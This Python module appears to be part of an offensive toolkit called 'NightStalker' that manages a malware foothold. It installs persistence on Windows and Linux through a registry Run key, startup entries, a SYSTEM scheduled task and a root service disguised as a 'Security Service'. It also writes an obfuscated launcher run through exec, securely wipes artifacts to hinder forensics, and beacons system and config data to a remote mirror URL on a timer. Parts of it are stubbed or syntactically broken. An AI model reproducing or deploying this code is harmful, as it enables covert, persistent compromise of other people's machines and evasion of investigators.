"""
Self-Rebuilding Environment Module
Manages environment persistence, cleanup, and portable operations
"""

import os
import shutil
import hashlib
import base64
import json
import time
import logging
import threading
import subprocess
import tempfile
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from pathlib import Path
import zipfile
import tarfile
import platform
import psutil

logger = logging.getLogger(__name__)

@dataclass
class EnvironmentConfig:
    """Configuration for environment management"""
    portable_mode: bool = False
    burn_after_use: bool = False
    mirror_mode: bool = False
    encryption_key: str = "nightstalker_env_key_2024"
    backup_locations: List[str] = None
    cleanup_patterns: List[str] = None
    persistence_methods: List[str] = None

class EnvironmentManager:
    """Manages environment persistence, cleanup, and portable operations"""
    
    def __init__(self, config: EnvironmentConfig = None):
        self.config = config or EnvironmentConfig()
        self.workspace_path = Path.cwd()
        self.temp_dir = Path(tempfile.gettempdir()) / "nightstalker"
        self.backup_dir = self.workspace_path / "backups"
        self.artifacts: List[str] = []
        
        # Initialize environment
        self._setup_environment()
    
    def _setup_environment(self):
        """Setup the working environment"""
        try:
            # Create necessary directories
            self.temp_dir.mkdir(exist_ok=True)
            self.backup_dir.mkdir(exist_ok=True)
            
            # Setup default configurations
            if self.config.backup_locations is None:
                self.config.backup_locations = [
                    str(self.backup_dir),
                    str(Path.home() / ".nightstalker"),
                    str(Path.home() / "Documents" / "nightstalker_backup")
                ]
            
            if self.config.cleanup_patterns is None:
                self.config.cleanup_patterns = [
                    "*.log", "*.tmp", "*.cache", "*.temp",
                    "results/*.json", "payloads/*.exe", "payloads/*.dll"
                ]
            
            if self.config.persistence_methods is None:
                self.config.persistence_methods = [
                    'registry', 'startup', 'scheduled_task', 'service'
                ]
            
            logger.info("Environment setup completed")
            
        except Exception as e:
            logger.error(f"Environment setup failed: {e}")
    
    def enable_portable_mode(self, usb_path: str = None):
        """Enable portable mode for USB-based operations"""
        try:
            self.config.portable_mode = True
            
            if usb_path:
                portable_dir = Path(usb_path) / "nightstalker_portable"
            else:
                # Auto-detect USB drives
                portable_dir = self._find_usb_drive()
            
            if not portable_dir:
                logger.warning("No USB drive found, using local portable directory")
                portable_dir = self.workspace_path / "portable"
            
            portable_dir.mkdir(exist_ok=True)
            
            # Create portable environment
            self._create_portable_environment(portable_dir)
            
            logger.info(f"Portable mode enabled: {portable_dir}")
            return str(portable_dir)
            
        except Exception as e:
            logger.error(f"Failed to enable portable mode: {e}")
            return None
    
    def _find_usb_drive(self) -> Optional[Path]:
        """Find available USB drive for portable mode"""
        try:
            if platform.system().lower() == 'windows':
                return self._find_windows_usb_drive()
            else:
                return self._find_linux_usb_drive()
        except Exception as e:
            logger.error(f"USB drive detection failed: {e}")
            return None
    
    def _find_windows_usb_drive(self) -> Optional[Path]:
        """Find USB drive on Windows"""
        try:
            import wmi
            c = wmi.WMI()
            
            for drive in c.Win32_LogicalDisk():
                if drive.DriveType == 2:  # Removable drive
                    drive_path = Path(drive.DeviceID)
                    if drive_path.exists() and self._is_writable(drive_path):
                        return drive_path
        except Exception as e:
            logger.debug(f"WMI USB detection failed: {e}")
        
        return None
    
    def _find_linux_usb_drive(self) -> Optional[Path]:
        """Find USB drive on Linux"""
        try:
            # Check common mount points
            mount_points = ['/media', '/mnt', '/run/media']
            
            for mount_point in mount_points:
                mount_path = Path(mount_point)
                if mount_path.exists():
                    for item in mount_path.iterdir():
                        if item.is_dir() and self._is_writable(item):
                            return item
        except Exception as e:
            logger.debug(f"Linux USB detection failed: {e}")
        
        return None
    
    def _is_writable(self, path: Path) -> bool:
        """Check if path is writable"""
        try:
            check_file = path / ".nightstalker_check"
            check_file.touch()
            check_file.unlink()
            return True
        except Exception:
            return False
    
    def _create_portable_environment(self, portable_dir: Path):
        """Create portable environment with encrypted components"""
        try:
            # Create directory structure
            (portable_dir / "core").mkdir(exist_ok=True)
            (portable_dir / "payloads").mkdir(exist_ok=True)
            (portable_dir / "config").mkdir(exist_ok=True)
            (portable_dir / "results").mkdir(exist_ok=True)
            
            # Copy core files
            core_files = [
                "nightstalker/__init__.py",
                "nightstalker/core/automation.py",
                "nightstalker/core/fuzzer.py",
                "nightstalker/core/exfiltration.py",
                "nightstalker/core/infection_watchers.py",
                "nightstalker/core/self_rebuild.py"
            ]
            
            for file_path in core_files:
                src_path = Path(file_path)
                if src_path.exists():
                    dst_path = portable_dir / "core" / src_path.name
                    shutil.copy2(src_path, dst_path)
            
            # Create encrypted launcher
            self._create_encrypted_launcher(portable_dir)
            
            # Create portable configuration
            portable_config = {
                'portable_mode': True,
                'created_at': time.time(),
                'version': '1.0.0',
                'encryption_key': self.config.encryption_key
            }
            
            config_path = portable_dir / "config" / "portable.json"
            with open(config_path, 'w') as f:
                json.dump(portable_config, f, indent=2)
            
            logger.info("Portable environment created successfully")
            
        except Exception as e:
            logger.error(f"Failed to create portable environment: {e}")
    
    def _create_encrypted_launcher(self, portable_dir: Path):
        """Create encrypted launcher for portable mode"""
        try:
            launcher_code = f'''
import sys
import os
import base64
import hashlib
from pathlib import Path

# Add core directory to path
core_dir = Path(__file__).parent / "core"
sys.path.insert(0, str(core_dir))

# Import nightstalker components
from automation import AttackChain
from fuzzer import GeneticFuzzer
from exfiltration import CovertChannels
from infection_watchers import FileMonitor
from self_rebuild import EnvironmentManager

def main():
    print("NightStalker Portable Launcher")
    print("=" * 40)
    
    # Initialize components
    env_manager = EnvironmentManager()
    attack_chain = AttackChain()
    fuzzer = GeneticFuzzer()
    exfil = CovertChannels()
    file_monitor = FileMonitor()
    
    print("Components loaded successfully")
    print("Ready for operations")

if __name__ == "__main__":
    main()
'''
            
            # Encrypt launcher code
            encrypted_code = self._encrypt_data(launcher_code.encode())
            
            # Create launcher file
            launcher_path = portable_dir / "launcher.py"
            with open(launcher_path, 'w') as f:
                f.write(f'''
# Encrypted NightStalker Launcher
import base64

def decrypt_launcher():
    encrypted_data = {repr(encrypted_code)}
    return base64.b64decode(encrypted_data).decode()

exec(decrypt_launcher())
''')
            
            logger.info("Encrypted launcher created")
            
        except Exception as e:
            logger.error(f"Failed to create encrypted launcher: {e}")
    
    def _encrypt_data(self, data: bytes) -> str:
        """Encrypt data using simple XOR encryption"""
        key_bytes = self.config.encryption_key.encode()
        encrypted = bytearray()
        
        for i, byte in enumerate(data):
            key_byte = key_bytes[i % len(key_bytes)]
            encrypted.append(byte ^ key_byte)
        
        return base64.b64encode(bytes(encrypted)).decode()
    
    def _decrypt_data(self, encrypted_data: str) -> bytes:
        """Decrypt data"""
        data = base64.b64decode(encrypted_data)
        key_bytes = self.config.encryption_key.encode()
        decrypted = bytearray()
        
        for i, byte in enumerate(data):
            key_byte = key_bytes[i % len(key_bytes)]
            decrypted.append(byte ^ key_byte)
        
        return bytes(decrypted)
    
    def enable_burn_mode(self):
        """Enable burn-after-use mode for secure cleanup"""
        self.config.burn_after_use = True
        logger.info("Burn mode enabled - all artifacts will be securely deleted")
    
    def enable_mirror_mode(self, mirror_url: str):
        """Enable mirror mode for network-based deployment"""
        try:
            self.config.mirror_mode = True
            
            # Create mirror configuration
            mirror_config = {
                'mirror_url': mirror_url,
                'sync_interval': 300,  # 5 minutes
                'auto_deploy': True,
                'encryption_enabled': True
            }
            
            config_path = self.workspace_path / "config" / "mirror.json"
            config_path.parent.mkdir(exist_ok=True)
            
            with open(config_path, 'w') as f:
                json.dump(mirror_config, f, indent=2)
            
            # Start mirror sync thread
            sync_thread = threading.Thread(
                target=self._mirror_sync_worker,
                args=(mirror_config,),
                daemon=True
            )
            sync_thread.start()
            
            logger.info(f"Mirror mode enabled: {mirror_url}")
            
        except Exception as e:
            logger.error(f"Failed to enable mirror mode: {e}")
    
    def _mirror_sync_worker(self, mirror_config: Dict[str, Any]):
        """Background worker for mirror synchronization"""
        while True:
            try:
                self._sync_with_mirror(mirror_config['mirror_url'])
                time.sleep(mirror_config['sync_interval'])
            except Exception as e:
                logger.error(f"Mirror sync failed: {e}")
                time.sleep(60)  # Wait before retry
    
    def _sync_with_mirror(self, mirror_url: str):
        """Synchronize with mirror server"""
        try:
            import requests
            
            # Get local file hashes
            local_files = self._get_file_hashes()
            
            # Send to mirror
            sync_data = {
                'timestamp': time.time(),
                'files': local_files,
                'environment': self._get_environment_info()
            }
            
            response = requests.post(
                f"{mirror_url}/sync",
                json=sync_data,
                timeout=30
            )
            
            if response.status_code == 200:
                mirror_files = response.json().get('files', {})
                self._update_from_mirror(mirror_files)
            
        except Exception as e:
            logger.error(f"Mirror sync error: {e}")
    
    def _get_file_hashes(self) -> Dict[str, str]:
        """Get hashes of important files"""
        file_hashes = {}
        
        important_files = [
            "nightstalker/__init__.py",
            "nightstalker/core/automation.py",
            "nightstalker/core/fuzzer.py",
            "nightstalker/core/exfiltration.py",
            "nightstalker/core/infection_watchers.py",
            "nightstalker/core/self_rebuild.py"
        ]
        
        for file_path in important_files:
            path = Path(file_path)
            if path.exists():
                with open(path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                    file_hashes[str(path)] = file_hash
        
        return file_hashes
    
    def _get_environment_info(self) -> Dict[str, Any]:
        """Get current environment information"""
        return {
            'platform': platform.system(),
            'python_version': platform.python_version(),
            'workspace_path': str(self.workspace_path),
            'temp_dir': str(self.temp_dir),
            'config': self.config.__dict__
        }
    
    def _update_from_mirror(self, mirror_files: Dict[str, str]):
        """Update local files from mirror"""
        local_files = self._get_file_hashes()
        
        for file_path, mirror_hash in mirror_files.items():
            if file_path not in local_files or local_files[file_path] != mirror_hash:
                logger.info(f"Updating file from mirror: {file_path}")
                # In a real implementation, download and update the file
    
    def create_backup(self, backup_name: str = None) -> str:
        """Create encrypted backup of the environment"""
        try:
            if backup_name is None:
                backup_name = f"nightstalker_backup_{int(time.time())}"
            
            backup_path = self.backup_dir / f"{backup_name}.tar.gz"
            
            # Create temporary directory for backup
            temp_backup_dir = self.temp_dir / "backup_temp"
            temp_backup_dir.mkdir(exist_ok=True)
            
            # Copy important files
            important_dirs = [
                "nightstalker",
                "config",
                "results",
                "payloads"
            ]
            
            for dir_name in important_dirs:
                src_dir = self.workspace_path / dir_name
                if src_dir.exists():
                    dst_dir = temp_backup_dir / dir_name
                    shutil.copytree(src_dir, dst_dir, dirs_exist_ok=True)
            
            # Create archive
            with tarfile.open(backup_path, 'w:gz') as tar:
                tar.add(temp_backup_dir, arcname='')
            
            # Cleanup temp directory
            shutil.rmtree(temp_backup_dir)
            
            # Encrypt backup
            encrypted_backup_path = self._encrypt_file(backup_path)
            
            logger.info(f"Backup created: {encrypted_backup_path}")
            return str(encrypted_backup_path)
            
        except Exception as e:
            logger.error(f"Backup creation failed: {e}")
            return None
    
    def _encrypt_file(self, file_path: Path) -> Path:
        """Encrypt a file"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted_data = self._encrypt_data(data)
            
            encrypted_path = file_path.with_suffix('.enc')
            with open(encrypted_path, 'w') as f:
                f.write(encrypted_data)
            
            # Remove original file
            file_path.unlink()
            
            return encrypted_path
            
        except Exception as e:
            logger.error(f"File encryption failed: {e}")
            return file_path
    
    def restore_backup(self, backup_path: str) -> bool:
        """Restore environment from backup"""
        try:
            backup_file = Path(backup_path)
            if not backup_file.exists():
                logger.error(f"Backup file not found: {backup_path}")
                return False
            
            # Decrypt if needed
            if backup_file.suffix == '.enc':
                decrypted_path = self._decrypt_file(backup_file)
            else:
                decrypted_path = backup_file
            
            # Extract backup
            extract_dir = self.temp_dir / "restore_temp"
            extract_dir.mkdir(exist_ok=True)
            
            with tarfile.open(decrypted_path, 'r:gz') as tar:
                tar.extractall(extract_dir)
            
            # Restore files
            for item in extract_dir.iterdir():
                if item.is_dir():
                    dst_path = self.workspace_path / item.name
                    if dst_path.exists():
                        shutil.rmtree(dst_path)
                    shutil.move(str(item), str(dst_path))
            
            # Cleanup
            shutil.rmtree(extract_dir)
            if decrypted_path != backup_file:
                decrypted_path.unlink()
            
            logger.info("Backup restored successfully")
            return True
            
        except Exception as e:
            logger.error(f"Backup restoration failed: {e}")
            return False
    
    def _decrypt_file(self, file_path: Path) -> Path:
        """Decrypt a file"""
        try:
            with open(file_path, 'r') as f:
                encrypted_data = f.read()
            
            decrypted_data = self._decrypt_data(encrypted_data)
            
            decrypted_path = file_path.with_suffix('.dec')
            with open(decrypted_path, 'wb') as f:
                f.write(decrypted_data)
            
            return decrypted_path
            
        except Exception as e:
            logger.error(f"File decryption failed: {e}")
            return file_path
    
    def secure_cleanup(self, patterns: List[str] = None):
        """Perform secure cleanup of artifacts"""
        try:
            if patterns is None:
                patterns = self.config.cleanup_patterns
            
            logger.info("Starting secure cleanup")
            
            # Cleanup files matching patterns
            for pattern in patterns:
                self._cleanup_pattern(pattern)
            
            # Cleanup temporary directory
            if self.temp_dir.exists():
                shutil.rmtree(self.temp_dir)
            
            # Cleanup artifacts
            for artifact in self.artifacts:
                self._secure_delete(artifact)
            
            # Clear memory
            self._clear_memory()
            
            logger.info("Secure cleanup completed")
            
        except Exception as e:
            logger.error(f"Secure cleanup failed: {e}")
    
    def _cleanup_pattern(self, pattern: str):
        """Cleanup files matching a pattern"""
        try:
            import glob
            
            # Handle relative and absolute patterns
            if pattern.startswith('*'):
                # Search in workspace
                search_path = self.workspace_path
            else:
                search_path = Path(pattern).parent
                pattern = Path(pattern).name
            
            if search_path.exists():
                for file_path in search_path.glob(pattern):
                    if file_path.is_file():
                        self._secure_delete(str(file_path))
                    elif file_path.is_dir():
                        shutil.rmtree(file_path)
                        
        except Exception as e:
            logger.error(f"Pattern cleanup failed for {pattern}: {e}")
    
    def _secure_delete(self, file_path: str):
        """Securely delete a file"""
        try:
            path = Path(file_path)
            if not path.exists():
                return
            
            # Overwrite with random data
            file_size = path.stat().st_size
            with open(path, 'wb') as f:
                f.write(os.urandom(file_size))
            
            # Overwrite with zeros
            with open(path, 'wb') as f:
                f.write(b'\x00' * file_size)
            
            # Overwrite with ones
            with open(path, 'wb') as f:
                f.write(b'\xff' * file_size)
            
            # Delete file
            path.unlink()
            
        except Exception as e:
            logger.error(f"Secure delete failed for {file_path}: {e}")
    
    def _clear_memory(self):
        """Clear sensitive data from memory"""
        try:
            # Clear Python variables
            import gc
            gc.collect()
            
            # Clear process memory (platform specific)
            if platform.system().lower() == 'windows':
                # Windows memory clearing
                pass
            else:
                # Linux memory clearing
                pass
                
        except Exception as e:
            logger.error(f"Memory clearing failed: {e}")
    
    def setup_persistence(self, methods: List[str] = None):
        """Setup persistence mechanisms"""
        try:
            if methods is None:
                methods = self.config.persistence_methods
            
            for method in methods:
                if method == 'registry':
                    self._setup_registry_persistence()
                elif method == 'startup':
                    self._setup_startup_persistence()
                elif method == 'scheduled_task':
                    self._setup_scheduled_task_persistence()
                elif method == 'service':
                    self._setup_service_persistence()
            
            logger.info("Persistence mechanisms configured")
            
        except Exception as e:
            logger.error(f"Persistence setup failed: {e}")
    
    def _setup_registry_persistence(self):
        """Setup Windows registry persistence"""
        if platform.system().lower() != 'windows':
            return
        
        try:
            import winreg
            
            # Create registry key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            # Add startup entry
            launcher_path = str(self.workspace_path / "launcher.py")
            winreg.SetValueEx(key, "NightStalker", 0, winreg.REG_SZ, launcher_path)
            
            winreg.CloseKey(key)
            logger.info("Registry persistence configured")
            
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
    
    def _setup_startup_persistence(self):
        """Setup startup folder persistence"""
        try:
            if platform.system().lower() == 'windows':
                startup_path = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            else:
                startup_path = Path.home() / ".config" / "autostart"
            
            startup_path.mkdir(parents=True, exist_ok=True)
            
            # Create startup script
            startup_script = startup_path / "nightstalker.desktop"
            with open(startup_script, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=NightStalker
Exec=python {self.workspace_path}/launcher.py
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            
            logger.info("Startup persistence configured")
            
        except Exception as e:
            logger.error(f"Startup persistence failed: {e}")
    
    def _setup_scheduled_task_persistence(self):
        """Setup scheduled task persistence"""
        try:
            if platform.system().lower() == 'windows':
                # Windows scheduled task
                cmd = [
                    'schtasks', '/create', '/tn', 'NightStalker',
                    '/tr', f'python {self.workspace_path}/launcher.py',
                    '/sc', 'onlogon', '/ru', 'SYSTEM'
                ]
                subprocess.run(cmd, check=True)
            else:
                # Linux cron job
                cron_entry = f"@reboot python {self.workspace_path}/launcher.py"
                subprocess.run(['crontab', '-l'], capture_output=True)
                # Add to crontab
            
            logger.info("Scheduled task persistence configured")
            
        except Exception as e:
            logger.error(f"Scheduled task persistence failed: {e}")
    
    def _setup_service_persistence(self):
        """Setup service persistence"""
        try:
            if platform.system().lower() == 'windows':
                # Windows service
                service_script = f"""
try:
import win32serviceutil
import win32service
import win32event
import servicemanager
import sys
import os

class NightStalkerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "NightStalker"
    _svc_display_name_ = "NightStalker Security Service"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
    
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
    
    def SvcDoRun(self):
        os.system(f'python {self.workspace_path}/launcher.py')

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(NightStalkerService)
except ImportError:
    print("Windows service modules not available")
    sys.exit(1)
"""
                
                service_path = self.workspace_path / "service.py"
                with open(service_path, 'w') as f:
                    f.write(service_script)
                
                # Install service
                subprocess.run(['python', str(service_path), 'install'])
                
            else:
                # Linux systemd service
                service_file = f"""[Unit]
Description=NightStalker Security Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=python {self.workspace_path}/launcher.py
Restart=always

[Install]
WantedBy=multi-user.target
"""
                
                service_path = Path("/etc/systemd/system/nightstalker.service")
                with open(service_path, 'w') as f:
                    f.write(service_file)
                
                # Enable service
                subprocess.run(['systemctl', 'enable', 'nightstalker.service'])
            
            logger.info("Service persistence configured")
            
        except Exception as e:
            logger.error(f"Service persistence failed: {e}")
    
    def get_environment_status(self) -> Dict[str, Any]:
        """Get current environment status"""
        return {
            'portable_mode': self.config.portable_mode,
            'burn_after_use': self.config.burn_after_use,
            'mirror_mode': self.config.mirror_mode,
            'workspace_path': str(self.workspace_path),
            'temp_dir': str(self.temp_dir),
            'backup_dir': str(self.backup_dir),
            'artifacts_count': len(self.artifacts),
            'platform': platform.system(),
            'python_version': platform.python_version(),
            'memory_usage': psutil.Process().memory_info().rss
        } 